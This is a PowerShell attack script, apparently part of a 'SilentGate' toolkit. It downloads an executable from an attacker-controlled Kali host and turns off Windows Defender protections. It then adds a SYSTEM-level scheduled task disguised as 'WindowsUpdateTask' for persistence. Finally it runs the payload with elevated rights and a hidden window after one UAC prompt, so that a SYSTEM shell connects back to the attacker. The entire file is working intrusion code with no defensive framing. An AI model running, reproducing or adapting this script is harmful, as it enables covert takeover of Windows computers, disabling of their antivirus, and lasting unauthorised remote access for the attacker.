# SilentGate Level 2 - Silent SYSTEM
# Author: JarDani
# From medium shell → one UAC click → SYSTEM
# User sees UAC prompt once - nothing else

$kali = "192.168.178.144"
$port = 8080
$lpe  = "C:\ProgramData\lpe"

New-Item -ItemType Directory -Path $lpe -Force | Out-Null

# Download sg_system.exe
(New-Object Net.WebClient).DownloadFile(
    "http://${kali}:${port}/output/sg_system.exe",
    "$lpe\sg_system.exe")

# Build HIGH integrity payload
$payload = @"
`$lpe = 'C:\ProgramData\lpe'

# Disable Defender silently
Set-MpPreference -DisableRealtimeMonitoring `$true -Force 2>`$null
Set-MpPreference -DisableIOAVProtection `$true -Force 2>`$null
Set-MpPreference -DisableBehaviorMonitoring `$true -Force 2>`$null

# Add persistence - scheduled task at boot
schtasks /delete /tn "WindowsUpdateTask" /f 2>`$null
schtasks /create /tn "WindowsUpdateTask" /tr "`$lpe\sg_system.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>`$null

# Run sg_system.exe as HIGH integrity - steals SYSTEM token
Start-Process "`$lpe\sg_system.exe" -WindowStyle Hidden
"@

$payload | Out-File "$lpe\sg_l2.ps1" -Encoding ASCII

# UAC bypass via ShellExecuteEx
$code = @"
using System;
using System.Runtime.InteropServices;
public class UAC {
    [DllImport("shell32.dll")]
    public static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO i);
    [StructLayout(LayoutKind.Sequential)]
    public struct SHELLEXECUTEINFO {
        public int cbSize;
        public uint fMask;
        public IntPtr hwnd;
        [MarshalAs(UnmanagedType.LPStr)] public string lpVerb;
        [MarshalAs(UnmanagedType.LPStr)] public string lpFile;
        [MarshalAs(UnmanagedType.LPStr)] public string lpParameters;
        [MarshalAs(UnmanagedType.LPStr)] public string lpDirectory;
        public int nShow;
        public IntPtr hInstApp;
        public IntPtr lpIDList;
        [MarshalAs(UnmanagedType.LPStr)] public string lpClass;
        public IntPtr hkeyClass;
        public uint dwHotKey;
        public IntPtr hIcon;
        public IntPtr hProcess;
    }
}
"@

try { Add-Type -TypeDefinition $code } catch {}

$info = New-Object UAC+SHELLEXECUTEINFO
$info.cbSize       = [Runtime.InteropServices.Marshal]::SizeOf($info)
$info.lpVerb       = "runas"
$info.lpFile       = "powershell.exe"
$info.lpParameters = "-ep bypass -w hidden -f `"$lpe\sg_l2.ps1`""
$info.nShow        = 0
[UAC]::ShellExecuteEx([ref]$info) | Out-Null

Write-Host "[*] UAC prompt sent - click YES once"
Write-Host "[*] After YES: SYSTEM shell connects to Kali"
Write-Host "[*] Persistence added - survives reboot"
